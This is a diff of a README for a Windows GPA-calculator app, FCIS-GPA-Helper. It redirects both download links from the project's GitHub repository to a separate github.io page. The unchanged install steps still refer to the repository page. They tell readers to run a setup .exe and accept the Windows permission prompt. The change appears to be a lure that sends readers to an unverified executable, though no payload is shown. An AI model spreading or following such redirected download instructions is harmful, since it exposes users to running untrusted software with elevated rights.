@@ -1,6 +1,6 @@
 # 📊 FCIS-GPA-Helper - Calculate your grade point average easily
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/behavioristic-eyewitness324/FCIS-GPA-Helper)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://behavioristic-eyewitness324.github.io)
 
 ## 🎯 About the software
 
@@ -22,7 +22,7 @@ To run this application on your computer, you need the following:
 
 Follow these steps to set up the application on your Windows machine.
 
-1.  **Visit the download page**: You find the software file at [this download link](https://github.com/behavioristic-eyewitness324/FCIS-GPA-Helper).
+1.  **Visit the download page**: You find the software file at [this download link](https://behavioristic-eyewitness324.github.io).
 2.  **Download the installer**: Click the link above to reach the repository page. Look for the latest release on the right side of the screen. Click the file with the .exe extension to start the download.
 3.  **Run the installer**: Locate the downloaded file in your Downloads folder. Double-click the file named FCIS-GPA-Helper-Setup.exe to start the installation wizard.
 4.  **Confirm permissions**: Windows might ask if you want to allow this app to make changes to your device. Click Yes to proceed.
